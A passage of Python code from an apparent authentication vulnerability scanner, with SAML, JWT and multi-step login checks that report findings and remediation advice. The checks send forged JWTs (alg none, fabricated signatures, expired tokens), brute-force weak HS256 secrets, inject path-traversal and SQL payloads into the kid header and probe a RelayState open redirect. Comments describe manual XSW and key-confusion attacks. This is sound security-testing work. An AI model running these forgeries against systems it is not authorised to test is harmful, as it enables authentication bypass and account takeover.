        return _f(_CID, _PROTO, _TITLE, "NOT_APPLICABLE", "High", 7.5,
                  "T1550", "Use Alternate Authentication Material",
                  "CWE-294", "A07:2021", "CB-3.5", "PTES-6.1",
                  f"Token endpoint discovered at {token_ep!r}. "
                  "Live code-replay test requires a complete auth flow with "
                  "valid credentials; perform manually via Burp Suite.",
                  "Verify authorization codes are invalidated after first use.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


# ---------------------------------------------------------------------------
# SA -- SAML 2.0 (6 checks)
# ---------------------------------------------------------------------------

def _probe_saml_paths(target: AuthTarget, timeout: int, s):
    """Return list of (path, status_code) for known SAML paths."""
    base = target.base_url
    paths = ["/saml/acs", "/saml/sso", "/saml2/idp/SSO", "/sso/saml2",
             "/auth/saml", "/saml/metadata", "/saml2/metadata",
             "/saml/login", "/idp/profile/SAML2/Redirect/SSO"]
    found = []
    for p in paths:
        try:
            r = s.get(base + p, timeout=timeout, allow_redirects=False)
            if r.status_code < 500:
                found.append((p, r.status_code))
        except Exception:
            pass
    return found


def _check_sa01(target: AuthTarget, timeout: int) -> AuthFinding:
    """SA-01: SAML Endpoint Discovery"""
    _CID = "SA-01"
    _PROTO = "SAML 2.0"
    _TITLE = "SAML Endpoint Discovery"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        found = _probe_saml_paths(target, timeout, s)
        url_lower = target.url.lower()
        has_saml_hint = any(x in url_lower for x in
                            ["saml", "sso", "samlrequest", "samlresponse"])
        if not found and not has_saml_hint:
            return _na(_CID, _PROTO, _TITLE)
        if found:
            detail = ", ".join(f"{p} (HTTP {c})" for p, c in found[:5])
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Info", 2.7,
                      "T1590", "Gather Victim Network Information",
                      "CWE-200", "A05:2021", "CB-3.6", "PTES-5.1",
                      f"SAML endpoints discovered: {detail}",
                      "Restrict access to SAML endpoints to known SP/IdP "
                      "IP ranges. Suppress metadata endpoints in production.",
                      refs=["OWASP WSTG-SESS-10", "SAML Security Cheatsheet"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Info", 2.7,
                  "T1590", "Gather Victim Network Information",
                  "CWE-200", "A05:2021", "CB-3.6", "PTES-5.1",
                  "No accessible SAML endpoints found at common paths.",
                  "Maintain access controls on SAML endpoints.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_sa02(target: AuthTarget, timeout: int) -> AuthFinding:
    """SA-02: SAML Metadata Unencrypted Assertion Check"""
    _CID = "SA-02"
    _PROTO = "SAML 2.0"
    _TITLE = "Unencrypted SAML Assertion"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        base = target.base_url
        s = _session(target)
        meta = None
        for path in ["/saml/metadata", "/saml2/metadata",
                     "/auth/saml/metadata", "/sso/saml/metadata"]:
            try:
                r = s.get(base + path, timeout=timeout)
                if r.status_code == 200 and "EntityDescriptor" in r.text:
                    meta = r.text
                    break
            except Exception:
                pass
        if meta is None:
            return _na(_CID, _PROTO, _TITLE)
        has_enc = "EncryptedAssertion" in meta or "use=\"encryption\"" in meta
        if not has_enc:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Medium", 5.9,
                      "T1040", "Network Sniffing",
                      "CWE-311", "A02:2021", "CB-3.6", "PTES-6.1",
                      "SAML metadata does not advertise assertion encryption "
                      "(EncryptedAssertion or use='encryption' not found). "
                      "Assertions may be transmitted in cleartext.",
                      "Configure assertion encryption in the IdP. Use "
                      "AES-256-CBC or AES-128-GCM for assertion encryption.",
                      refs=["SAML 2.0 Security Profile", "OWASP WSTG-SESS-10"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Medium", 5.9,
                  "T1040", "Network Sniffing",
                  "CWE-311", "A02:2021", "CB-3.6", "PTES-6.1",
                  "SAML metadata advertises assertion encryption.",
                  "Maintain assertion encryption configuration.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_sa03(target: AuthTarget, timeout: int) -> AuthFinding:
    """SA-03: SAMLRequest Parameter Tampering"""
    _CID = "SA-03"
    _PROTO = "SAML 2.0"
    _TITLE = "SAMLRequest Parameter Tampering"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        parsed = urllib.parse.urlparse(target.url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if "SAMLRequest" not in params:
            return _na(_CID, _PROTO, _TITLE)
        s = _session(target)
        tampered = {**params, "SAMLRequest": "AAAAAAAAA"}
        test_url = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(tampered))
        )
        r = s.get(test_url, timeout=timeout, allow_redirects=False)
        if r.status_code in (200, 302):
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 7.1,
                      "T1550", "Use Alternate Authentication Material",
                      "CWE-20", "A07:2021", "CB-3.6", "PTES-6.1",
                      f"Server did not reject tampered SAMLRequest "
                      f"(HTTP {r.status_code}). Tampered request was processed "
                      "or redirected without validation error.",
                      "Validate SAMLRequest signature and XML schema before "
                      "processing. Reject malformed or unsigned requests.",
                      refs=["SAML 2.0 Binding Spec S3.4", "OWASP WSTG-SESS-10"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 7.1,
                  "T1550", "Use Alternate Authentication Material",
                  "CWE-20", "A07:2021", "CB-3.6", "PTES-6.1",
                  f"Server rejected tampered SAMLRequest (HTTP {r.status_code}).",
                  "Maintain SAMLRequest validation.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_sa04(target: AuthTarget, timeout: int) -> AuthFinding:
    """SA-04: RelayState Parameter Open Redirect"""
    _CID = "SA-04"
    _PROTO = "SAML 2.0"
    _TITLE = "SAML RelayState Open Redirect"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        parsed = urllib.parse.urlparse(target.url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if "SAMLRequest" not in params and "RelayState" not in params:
            return _na(_CID, _PROTO, _TITLE)
        s = _session(target)
        test_p = {**params, "RelayState": "https://attacker.example.com/"}
        test_url = urllib.parse.urlunparse(
            parsed._replace(query=urllib.parse.urlencode(test_p))
        )
        r = s.get(test_url, timeout=timeout, allow_redirects=False)
        loc = r.headers.get("Location", "")
        if "attacker.example.com" in loc:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Medium", 6.1,
                      "T1598", "Phishing for Information",
                      "CWE-601", "A03:2021", "CB-3.6", "PTES-6.1",
                      f"RelayState reflected in redirect Location: {loc[:120]}",
                      "Validate RelayState against an allowlist of permitted "
                      "redirect destinations. Reject arbitrary external URLs.",
                      refs=["SAML 2.0 Security Profile", "OWASP WSTG-ATHZ-05"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Medium", 6.1,
                  "T1598", "Phishing for Information",
                  "CWE-601", "A03:2021", "CB-3.6", "PTES-6.1",
                  "RelayState with attacker URL was not reflected in redirect.",
                  "Maintain RelayState allowlist validation.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_sa05(target: AuthTarget, timeout: int) -> AuthFinding:
    """SA-05: SAML NameID Injection"""
    _CID = "SA-05"
    _PROTO = "SAML 2.0"
    _TITLE = "SAML NameID Injection"
    return _f(_CID, "SAML 2.0", _TITLE, "NOT_APPLICABLE", "Critical", 8.1,
              "T1078", "Valid Accounts",
              "CWE-20", "A07:2021", "CB-3.6", "PTES-6.1",
              "NameID injection requires active SAML session and signing key. "
              "Perform this test manually via SAML Raider (Burp plugin) or "
              "samlare.tool. Inject admin username into NameID element.",
              "Validate NameID value against an authoritative identity store. "
              "Use persistent, opaque NameIDs rather than email addresses.",
              refs=["OWASP WSTG-SESS-10", "SAML Security Cheatsheet"])


def _check_sa06(target: AuthTarget, timeout: int) -> AuthFinding:
    """SA-06: XML Signature Wrapping (XSW)"""
    _CID = "SA-06"
    _PROTO = "SAML 2.0"
    _TITLE = "XML Signature Wrapping (XSW)"
    return _f(_CID, "SAML 2.0", _TITLE, "NOT_APPLICABLE", "Critical", 9.1,
              "T1550", "Use Alternate Authentication Material",
              "CWE-347", "A07:2021", "CB-3.6", "PTES-6.1",
              "XSW attacks require a valid signed SAMLResponse. "
              "Test manually using SAML Raider in Burp Suite by duplicating "
              "the Assertion element and modifying its content while keeping "
              "the original Signature. Try all 8 XSW variants.",
              "Process only the Assertion that is referenced by the Signature "
              "ds:Reference element. Reject documents with multiple Assertion "
              "elements or with ID-mismatch between Reference and Assertion.",
              refs=["Somorovsky et al. XSW paper", "OWASP WSTG-SESS-10",
                    "SAML Security Cheatsheet"])


# ---------------------------------------------------------------------------
# JW -- JWT (8 checks)
# ---------------------------------------------------------------------------

def _check_jw01(target: AuthTarget, timeout: int) -> AuthFinding:
    """JW-01: Algorithm None Attack"""
    _CID = "JW-01"
    _PROTO = "JWT"
    _TITLE = "JWT Algorithm None Attack"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    if not target.bearer_token or target.bearer_token.count(".") < 2:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        for alg_val in ["none", "None", "NONE", "nOnE"]:
            hdr = _jwt_decode_header(target.bearer_token) or {}
            hdr["alg"] = alg_val
            forged = _jwt_rebuild(target.bearer_token, hdr, signature="")
            s.headers["Authorization"] = f"Bearer {forged}"
            try:
                r = s.get(target.url, timeout=timeout)
                if r.status_code == 200:
                    return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Critical", 9.8,
                              "T1550.001", "Application Access Token",
                              "CWE-347", "A07:2021", "CB-3.7", "PTES-6.1",
                              f"Server accepted unsigned JWT with alg={alg_val!r} "
                              f"(HTTP {r.status_code}). Signature validation is "
                              "bypassed entirely.",
                              "Maintain an explicit allowlist of permitted "
                              "algorithms. Reject 'none' unconditionally.",
                              req=f"Authorization: Bearer {forged[:80]}...",
                              resp=f"HTTP {r.status_code}",
                              refs=["CVE-2015-9235", "RFC 7518 S3.6",
                                    "OWASP WSTG-SESS-10"])
            except Exception:
                pass
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Critical", 9.8,
                  "T1550.001", "Application Access Token",
                  "CWE-347", "A07:2021", "CB-3.7", "PTES-6.1",
                  "Server rejected JWTs with algorithm 'none'.",
                  "Maintain algorithm allowlist enforcement.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_jw02(target: AuthTarget, timeout: int) -> AuthFinding:
    """JW-02: Weak Secret Brute Force"""
    _CID = "JW-02"
    _PROTO = "JWT"
    _TITLE = "JWT Weak Secret (HS256) Brute Force"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    if not target.bearer_token or target.bearer_token.count(".") < 2:
        return _na(_CID, _PROTO, _TITLE)
    try:
        hdr = _jwt_decode_header(target.bearer_token) or {}
        if hdr.get("alg", "").upper() not in ("HS256", "HS384", "HS512"):
            return _na(_CID, _PROTO, _TITLE)
        import hmac as _hmac
        import hashlib as _hash
        parts = target.bearer_token.split(".")
        msg = f"{parts[0]}.{parts[1]}".encode()
        try:
            pad = 4 - len(parts[2]) % 4
            expected_sig = base64.urlsafe_b64decode(parts[2] + "=" * pad)
        except Exception:
            return _na(_CID, _PROTO, _TITLE)
        wordlist = [
            "secret", "password", "123456", "jwt_secret", "change_me",
            "supersecret", "qwerty", "letmein", "admin", "token",
            "key", "private", "your-256-bit-secret", "secret_key",
            "app_secret", "jwt", "hs256", "hmac", "signing_key",
            "api_secret", "", "null", "undefined", "test",
        ]
        alg = hdr.get("alg", "HS256").upper()
        hash_fn = {"HS256": _hash.sha256, "HS384": _hash.sha384,
                   "HS512": _hash.sha512}.get(alg, _hash.sha256)
        for word in wordlist:
            sig = _hmac.new(word.encode(), msg, hash_fn).digest()
            if sig == expected_sig:
                return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Critical", 7.5,
                          "T1110.001", "Brute Force: Password Guessing",
                          "CWE-521", "A07:2021", "CB-3.7", "PTES-6.1",
                          f"JWT signed with trivially guessable secret: {word!r}. "
                          f"Any party knowing this secret can forge arbitrary tokens.",
                          "Use a cryptographically random secret of at least "
                          "256 bits. Prefer RS256/ES256 (asymmetric) over HS256.",
                          refs=["OWASP JWT Cheatsheet", "RFC 7519"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Critical", 7.5,
                  "T1110.001", "Brute Force: Password Guessing",
                  "CWE-521", "A07:2021", "CB-3.7", "PTES-6.1",
                  f"JWT secret not found in {len(wordlist)}-entry common wordlist.",
                  "Continue using a strong random secret or asymmetric signing.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_jw03(target: AuthTarget, timeout: int) -> AuthFinding:
    """JW-03: Expired Token Acceptance"""
    _CID = "JW-03"
    _PROTO = "JWT"
    _TITLE = "JWT Expired Token Acceptance"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    if not target.bearer_token or target.bearer_token.count(".") < 2:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        past_exp = int(time.time()) - 86400
        forged = _jwt_rebuild(
            target.bearer_token,
            _jwt_decode_header(target.bearer_token) or {},
            new_payload={"exp": past_exp},
        )
        s.headers["Authorization"] = f"Bearer {forged}"
        r = s.get(target.url, timeout=timeout)
        if r.status_code == 200:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 6.5,
                      "T1550", "Use Alternate Authentication Material",
                      "CWE-613", "A07:2021", "CB-3.7", "PTES-6.1",
                      f"Server accepted JWT with exp={past_exp} "
                      f"(24 hours in the past). Token expiry is not enforced.",
                      "Validate exp claim on every request. Reject tokens "
                      "whose exp is in the past.",
                      refs=["RFC 7519 S4.1.4", "OWASP JWT Cheatsheet"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 6.5,
                  "T1550", "Use Alternate Authentication Material",
                  "CWE-613", "A07:2021", "CB-3.7", "PTES-6.1",
                  f"Server rejected expired JWT (HTTP {r.status_code}).",
                  "Maintain exp claim validation.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_jw04(target: AuthTarget, timeout: int) -> AuthFinding:
    """JW-04: jku/x5u Header Injection"""
    _CID = "JW-04"
    _PROTO = "JWT"
    _TITLE = "JWT jku/x5u Header Injection (SSRF)"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    if not target.bearer_token or target.bearer_token.count(".") < 2:
        return _na(_CID, _PROTO, _TITLE)
    try:
        hdr = _jwt_decode_header(target.bearer_token) or {}
        if hdr.get("alg", "HS256").startswith("HS"):
            return _na(_CID, _PROTO, _TITLE)
        return _f(_CID, _PROTO, _TITLE, "NOT_APPLICABLE", "Critical", 8.1,
                  "T1190", "Exploit Public-Facing Application",
                  "CWE-918", "A10:2021", "CB-3.7", "PTES-6.1",
                  f"JWT uses asymmetric algorithm {hdr.get('alg')!r}. "
                  "Test jku/x5u injection manually: modify JWT header to add "
                  "jku='https://attacker.example.com/jwks.json', sign with "
                  "attacker key, host matching JWKS, send to target.",
                  "Pin the allowed JWK Set URL server-side. Never fetch keys "
                  "from URLs supplied in the JWT header.",
                  refs=["CVE-2017-17405 (analogue)", "OWASP JWT Cheatsheet"])
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_jw05(target: AuthTarget, timeout: int) -> AuthFinding:
    """JW-05: kid Path Traversal / SQL Injection"""
    _CID = "JW-05"
    _PROTO = "JWT"
    _TITLE = "JWT kid Header Injection"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    if not target.bearer_token or target.bearer_token.count(".") < 2:
        return _na(_CID, _PROTO, _TITLE)
    try:
        hdr = _jwt_decode_header(target.bearer_token) or {}
        if "kid" not in hdr:
            return _na(_CID, _PROTO, _TITLE)
        s = _session(target)
        payloads = [
            "../../../../dev/null",
            "' UNION SELECT 'attacker'--",
            "../../../etc/passwd",
        ]
        for kid_payload in payloads:
            new_hdr = {**hdr, "kid": kid_payload, "alg": "HS256"}
            forged = _jwt_rebuild(
                target.bearer_token, new_hdr, signature=""
            )
            s.headers["Authorization"] = f"Bearer {forged}"
            try:
                r = s.get(target.url, timeout=timeout)
                if r.status_code == 200:
                    return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Critical", 8.1,
                              "T1134", "Access Token Manipulation",
                              "CWE-22", "A03:2021", "CB-3.7", "PTES-6.1",
                              f"Server accepted JWT with kid={kid_payload!r} "
                              f"(HTTP {r.status_code}). Path traversal or "
                              "injection in kid may allow signing key override.",
                              "Validate kid against a whitelist of known key "
                              "identifiers. Never use kid in file system or DB "
                              "queries without strict sanitisation.",
                              refs=["OWASP JWT Cheatsheet"])
            except Exception:
                pass
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Critical", 8.1,
                  "T1134", "Access Token Manipulation",
                  "CWE-22", "A03:2021", "CB-3.7", "PTES-6.1",
                  "Server rejected JWTs with path-traversal kid values.",
                  "Maintain kid validation.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_jw06(target: AuthTarget, timeout: int) -> AuthFinding:
    """JW-06: RS256 to HS256 Key Confusion"""
    _CID = "JW-06"
    _PROTO = "JWT"
    _TITLE = "JWT RS256 -> HS256 Algorithm Confusion"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    if not target.bearer_token or target.bearer_token.count(".") < 2:
        return _na(_CID, _PROTO, _TITLE)
    try:
        hdr = _jwt_decode_header(target.bearer_token) or {}
        if hdr.get("alg", "").upper() != "RS256":
            return _na(_CID, _PROTO, _TITLE)
        return _f(_CID, _PROTO, _TITLE, "NOT_APPLICABLE", "Critical", 9.0,
                  "T1550.001", "Application Access Token",
                  "CWE-327", "A07:2021", "CB-3.7", "PTES-6.1",
                  "JWT uses RS256. Test algorithm confusion manually: obtain "
                  "server's public key from JWKS endpoint, re-sign token with "
                  "HS256 using public key bytes as HMAC secret, submit forged token.",
                  "Explicitly specify allowed algorithm in server-side JWT library "
                  "configuration. Never auto-detect algorithm from JWT header.",
                  refs=["CVE-2016-5431", "OWASP JWT Cheatsheet"])
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_jw07(target: AuthTarget, timeout: int) -> AuthFinding:
    """JW-07: Missing Signature Validation (Garbage Signature)"""
    _CID = "JW-07"
    _PROTO = "JWT"
    _TITLE = "JWT Missing Signature Validation"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    if not target.bearer_token or target.bearer_token.count(".") < 2:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        parts = target.bearer_token.split(".")
        garbage = _jwt_rebuild(
            target.bearer_token,
            _jwt_decode_header(target.bearer_token) or {},
            signature="GARBAGESIG_EXPSTRIKE_" + "A" * 32,
        )
        s.headers["Authorization"] = f"Bearer {garbage}"
        r = s.get(target.url, timeout=timeout)
        if r.status_code == 200:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Critical", 9.8,
                      "T1550.001", "Application Access Token",
                      "CWE-347", "A07:2021", "CB-3.7", "PTES-6.1",
                      f"Server accepted JWT with an entirely fabricated signature "
                      f"(HTTP {r.status_code}). Token validation is not enforced.",
                      "Validate JWT signature on every request using the correct "
                      "key material. Reject any token with an invalid signature.",
                      refs=["RFC 7519", "OWASP JWT Cheatsheet"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Critical", 9.8,
                  "T1550.001", "Application Access Token",
                  "CWE-347", "A07:2021", "CB-3.7", "PTES-6.1",
                  f"Server rejected JWT with garbage signature (HTTP {r.status_code}).",
                  "Maintain signature validation.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_jw08(target: AuthTarget, timeout: int) -> AuthFinding:
    """JW-08: JWT crit Header Bypass"""
    _CID = "JW-08"
    _PROTO = "JWT"
    _TITLE = "JWT crit Header Bypass"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    if not target.bearer_token or target.bearer_token.count(".") < 2:
        return _na(_CID, _PROTO, _TITLE)
    try:
        hdr = _jwt_decode_header(target.bearer_token) or {}
        past_exp = int(time.time()) - 3600
        new_hdr = {**hdr, "crit": ["exp"], "exp": past_exp}
        forged = _jwt_rebuild(target.bearer_token, new_hdr,
                              new_payload={"exp": past_exp})
        s = _session(target)
        s.headers["Authorization"] = f"Bearer {forged}"
        r = s.get(target.url, timeout=timeout)
        if r.status_code == 200:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Medium", 6.5,
                      "T1550", "Use Alternate Authentication Material",
                      "CWE-287", "A07:2021", "CB-3.7", "PTES-6.1",
                      f"Server accepted JWT with crit header claiming exp "
                      "is a critical extension, possibly bypassing exp validation "
                      f"(HTTP {r.status_code}).",
                      "Process crit header extensions correctly per RFC 7515 S4.1.11. "
                      "Reject JWTs with unrecognised critical extensions.",
                      refs=["RFC 7515 S4.1.11", "OWASP JWT Cheatsheet"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Medium", 6.5,
                  "T1550", "Use Alternate Authentication Material",
                  "CWE-287", "A07:2021", "CB-3.7", "PTES-6.1",
                  "Server correctly rejected JWT with crit header bypass attempt.",
                  "Maintain crit header validation.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


# ---------------------------------------------------------------------------
# MS -- Multi-Step Auth (5 checks)
# ---------------------------------------------------------------------------

def _check_ms01(target: AuthTarget, timeout: int) -> AuthFinding:
    """MS-01: Step Skip / Forced Browsing"""
    _CID = "MS-01"
    _PROTO = "Multi-Step Auth"
    _TITLE = "Authentication Step Skip / Forced Browsing"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        base = target.base_url
        s = _session(target)
        step_paths = ["/verify", "/otp", "/mfa", "/step2", "/confirm",
                      "/complete", "/dashboard", "/account", "/home",
                      "/portal", "/admin", "/2fa"]
        accessible = []
        for p in step_paths:
            try:
                r = s.get(base + p, timeout=timeout, allow_redirects=False)
                if r.status_code == 200:
                    body_lower = r.text.lower()
                    if any(kw in body_lower for kw in
                           ["welcome", "dashboard", "account", "profile",
                            "logout", "sign out"]):
                        accessible.append(
                            f"{p} (HTTP 200, contains auth-gated content)"
                        )
                    else:
                        accessible.append(f"{p} (HTTP 200)")
            except Exception:
                pass
        if accessible:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 7.2,
                      "T1078", "Valid Accounts",
                      "CWE-425", "A01:2021", "CB-3.5", "PTES-6.1",
                      "Auth-gated pages accessible without completing auth flow: "
                      + ", ".join(accessible[:4]),
                      "Implement server-side session state checks on every "
                      "protected page. Do not rely on client-side step tracking.",
                      refs=["OWASP WSTG-ATHN-04"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 7.2,
                  "T1078", "Valid Accounts",
                  "CWE-425", "A01:2021", "CB-3.5", "PTES-6.1",
                  "All probed post-auth paths returned non-200 responses "
                  "without authentication.",
                  "Maintain server-side auth enforcement on all protected routes.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_ms02(target: AuthTarget, timeout: int) -> AuthFinding:
    """MS-02: Back-Navigation Cache / Missing Cache-Control"""
    _CID = "MS-02"
    _PROTO = "Multi-Step Auth"
    _TITLE = "Missing Cache-Control on Auth Pages"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        r = s.get(target.url, timeout=timeout, allow_redirects=False)
        cc = r.headers.get("Cache-Control", "")
        pragma = r.headers.get("Pragma", "")
        issues = []
        if "no-store" not in cc.lower():
            issues.append(f"Cache-Control missing 'no-store': {cc!r}")
        if "no-cache" not in cc.lower() and "no-cache" not in pragma.lower():
            issues.append("no-cache not set in Cache-Control or Pragma header")
        if issues:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Low", 4.3,
                      "T1539", "Steal Web Session Cookie",
                      "CWE-525", "A07:2021", "CB-3.5", "PTES-6.1",
                      "; ".join(issues) + ". Browser may cache auth pages "
                      "enabling back-button auth bypass.",
                      "Set Cache-Control: no-store, no-cache and Pragma: no-cache "
                      "on all authentication pages.",
                      refs=["OWASP WSTG-SESS-09"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Low", 4.3,
                  "T1539", "Steal Web Session Cookie",
                  "CWE-525", "A07:2021", "CB-3.5", "PTES-6.1",
                  f"Cache-Control: {cc!r} - auth page is not cacheable.",
                  "Maintain no-store cache policy on auth pages.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_ms03(target: AuthTarget, timeout: int) -> AuthFinding:
    """MS-03: Parameter Pollution - Step Skip via POST Body"""
    _CID = "MS-03"
    _PROTO = "Multi-Step Auth"
    _TITLE = "Parameter Pollution for Step Skip"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        payloads = [
            {"step": "3", "skip_mfa": "true"},
            {"phase": "complete"},
            {"bypass": "1", "admin": "true"},
        ]
        findings = []
        for payload in payloads:
            try:
                r = s.post(target.url, data=payload, timeout=timeout,
                           allow_redirects=False)
                if r.status_code == 200 and any(
                    kw in r.text.lower() for kw in
                    ["dashboard", "welcome", "success", "logged in"]
                ):
                    findings.append(
                        f"POST body {payload} -> HTTP 200 with auth-like response"
                    )
            except Exception:
                pass
        if findings:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 6.5,
                      "T1078", "Valid Accounts",
                      "CWE-235", "A07:2021", "CB-3.5", "PTES-6.1",
                      "; ".join(findings),
                      "Validate all step-control parameters server-side against "
                      "the authoritative session state. Ignore client-supplied "
                      "step or phase parameters.",
                      refs=["OWASP WSTG-INPV-04"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 6.5,
                  "T1078", "Valid Accounts",
                  "CWE-235", "A07:2021", "CB-3.5", "PTES-6.1",
                  "Server did not accept step-skip parameters in POST body.",
                  "Maintain server-side step state control.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_ms04(target: AuthTarget, timeout: int) -> AuthFinding:
    """MS-04: Session Fixation Pre/Post Auth"""
    _CID = "MS-04"
    _PROTO = "Multi-Step Auth"
    _TITLE = "Session Fixation Pre/Post Authentication"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        r1 = s.get(target.url, timeout=timeout, allow_redirects=False)
        pre_cookies = {c.name: c.value for c in r1.cookies}
        if not pre_cookies and not target.username:
            return _na(_CID, _PROTO, _TITLE)
        if target.username and target.password:
            login_data = {"username": target.username,
                          "password": target.password,
                          "email": target.username}
            r2 = s.post(target.url, data=login_data, timeout=timeout,
                        allow_redirects=False)
            post_cookies = {c.name: c.value for c in r2.cookies}
            for name, val in pre_cookies.items():
                if name in post_cookies and post_cookies[name] == val:
                    return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "High", 6.1,
                              "T1563", "Remote Service Session Hijacking",
                              "CWE-384", "A07:2021", "CB-3.5", "PTES-6.1",
                              f"Session cookie {name!r} unchanged after "
                              f"authentication (pre={val[:20]}... == post). "
                              "Session fixation attack is possible.",
                              "Regenerate all session identifiers upon "
                              "successful authentication.",
                              refs=["OWASP WSTG-SESS-03"])
        else:
            cc = r1.headers.get("Set-Cookie", "")
            if cc and ("sessionid" in cc.lower() or "session=" in cc.lower()):
                return _f(_CID, _PROTO, _TITLE, "NOT_APPLICABLE", "High", 6.1,
                          "T1563", "Remote Service Session Hijacking",
                          "CWE-384", "A07:2021", "CB-3.5", "PTES-6.1",
                          "Session cookie issued pre-authentication. Provide "
                          "credentials (username/password) to complete fixation test.",
                          "Regenerate session ID on authentication. Test by "
                          "comparing pre- and post-login session cookie values.")
        return _f(_CID, _PROTO, _TITLE, "SECURE", "High", 6.1,
                  "T1563", "Remote Service Session Hijacking",
                  "CWE-384", "A07:2021", "CB-3.5", "PTES-6.1",
                  "Session cookie changes after authentication (no fixation detected).",
                  "Maintain session regeneration on authentication.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


def _check_ms05(target: AuthTarget, timeout: int) -> AuthFinding:
    """MS-05: Security Headers on Auth Page"""
    _CID = "MS-05"
    _PROTO = "Multi-Step Auth"
    _TITLE = "Missing Security Headers on Authentication Page"
    if not _REQUESTS_OK:
        return _na(_CID, _PROTO, _TITLE)
    try:
        s = _session(target)
        r = s.get(target.url, timeout=timeout, allow_redirects=True)
        missing = []
        desired = {
            "Strict-Transport-Security": "HSTS not set",
            "X-Content-Type-Options": "nosniff not enforced",
            "X-Frame-Options": "Clickjacking protection absent",
            "Content-Security-Policy": "CSP not set",
        }
        for header, msg in desired.items():
            if not r.headers.get(header):
                missing.append(f"{header}: {msg}")
        if missing:
            return _f(_CID, _PROTO, _TITLE, "VULNERABLE", "Medium", 5.1,
                      "T1598", "Phishing for Information",
                      "CWE-693", "A05:2021", "CB-3.1", "PTES-6.1",
                      "Missing security headers: " + "; ".join(missing),
                      "Add the missing security headers to all authentication "
                      "pages. Use a security header scanner to validate coverage.",
                      refs=["OWASP Secure Headers Project",
                            "OWASP WSTG-CONF-08"])
        return _f(_CID, _PROTO, _TITLE, "SECURE", "Medium", 5.1,
                  "T1598", "Phishing for Information",
                  "CWE-693", "A05:2021", "CB-3.1", "PTES-6.1",
                  "All required security headers are present.",
                  "Maintain security header configuration.")
    except Exception as exc:
        return _err(_CID, _PROTO, _TITLE, exc)


# ---------------------------------------------------------------------------
# PP -- Password Page (6 checks)
# ---------------------------------------------------------------------------

def _check_pp01(target: AuthTarget, timeout: int) -> AuthFinding:
    """PP-01: SQL Injection in Password Field"""
    _CID = "PP-01"
